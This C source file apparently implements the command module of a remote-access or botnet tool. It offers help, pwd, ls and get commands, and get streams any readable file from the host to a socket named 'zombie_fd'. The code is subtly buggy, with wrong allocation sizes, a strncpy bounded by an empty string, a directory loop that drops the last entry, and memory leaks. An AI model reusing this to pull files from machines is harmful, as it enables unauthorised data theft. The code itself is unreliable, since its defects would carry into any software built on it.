#include "cmd.h"
#include "conx.h"

static struct stat filestat;
static size_t buffer_length;

static void clean(void* ptr)
{
    free(ptr);
    ptr = NULL;
}

char* help_command()
{
    char* buffer = (char *)calloc(500, sizeof(char *));

    strcpy(buffer, "help           Available commands\n");
    strcat(buffer, "pwd            Get current directory.\n");
    strcat(buffer, "ls <directory> List files in directory.\n");
    strcat(buffer, "get <file>     Download the specified file.\n");

    return buffer;
}

char* current_directory()
{
    char* buffer = (char *)calloc(PATH_MAX, sizeof(char *));

    return (getcwd(buffer, PATH_MAX) != NULL) ? buffer : strncpy(buffer, strerror(errno), strlen(buffer));
}

static char get_file_type(mode_t filemode)
{
    switch (filemode & __S_IFMT) {
        case __S_IFBLK:  return 'b';            break;
        case __S_IFCHR:  return 'c';            break;
        case __S_IFDIR:  return 'd';            break;
        case __S_IFIFO:  return 'p';            break;
        case __S_IFLNK:  return 'l';            break;
        case __S_IFREG:  return 'f';            break;
        case __S_IFSOCK: return 's';            break;
        default: break;
    }
    return '?';
}

static char* get_file_info(const char *restrict filename,
                           const char *restrict filepath)
{
    char* fullpath = (char *)calloc(strlen(filepath) + strlen(filename) + 1, sizeof(char *));

    snprintf(fullpath, PATH_MAX, "%s/%s", filepath, filename);
    memset(&filestat, '\0', sizeof(filestat));

    char* file_info = (char *)calloc(MAX_INPUT, sizeof(char *));
    
    if(lstat(fullpath, &filestat) == -1)
    {
        snprintf(file_info, MAX_INPUT, "%s error -> %s\n", filename, strerror(errno));
    }
    else
    {
        snprintf(file_info, MAX_INPUT, "%c %s %lu bytes\n",
                                       get_file_type(filestat.st_mode),
                                       filename,
                                       filestat.st_size);
    }

    clean(fullpath);

    return file_info;
}

static char* iterate_directory(struct dirent ***restrict namelist,
                               const char *restrict filepath,
                               const int number_of_files)
{
    char* file_info = get_file_info((*namelist)[0]->d_name, filepath);
    char* directory_data = (char *)calloc(FILENAME_MAX, sizeof(char *));

    strncpy(directory_data, file_info, strlen(file_info));

    for(int inx = 1; inx < number_of_files - 1; inx++)
    {
        free(file_info);

        file_info = get_file_info((*namelist)[inx]->d_name, filepath);
        strncat(directory_data, file_info, strlen(file_info));

        free((*namelist)[inx]);
    }

    clean(file_info);
    return directory_data;
}

char* list_directories(const char *restrict buffer)
{
    buffer_length = strlen(buffer);
    char* filepath = (char *)calloc(buffer_length, sizeof(char *));
    
    if(buffer_length > 4)
        strncpy(filepath, buffer + 3, buffer_length - 4);
    else
        strcpy(filepath, ".");
    

    struct dirent** namelist;
    int number_of_files = 0;
    char* directory_data = NULL;

    if((number_of_files = scandir(filepath, &namelist, NULL, alphasort)) < 0)
    {
        directory_data = strerror(errno);
    }
    else
    {
        directory_data = iterate_directory(&namelist, filepath, number_of_files);
        clean(namelist);
    }

    clean(filepath);
    return directory_data;
}

void send_file(int zombie_fd, const char *restrict buffer)
{
    buffer_length = strlen(buffer);
    char* filepath = (char *)calloc(buffer_length, sizeof(char *));
    strncpy(filepath, buffer, buffer_length - 1);

    int file_fd = open(filepath, O_RDONLY | __O_CLOEXEC, S_IRUSR | S_IROTH | S_IRGRP);
    
    if(file_fd == -1)
    {
        send_command_result(strerror(errno));
        return;
    }
    struct stat statbuf;

    memset(&statbuf, '\0', sizeof(struct stat));
    fstat(file_fd, &statbuf);

    if(sendfile(zombie_fd, file_fd, NULL, statbuf.st_size) == -1){
        send_command_result(strerror(errno));
    }

    memset(&statbuf, '\0', sizeof(struct stat));
    clean(filepath);
}
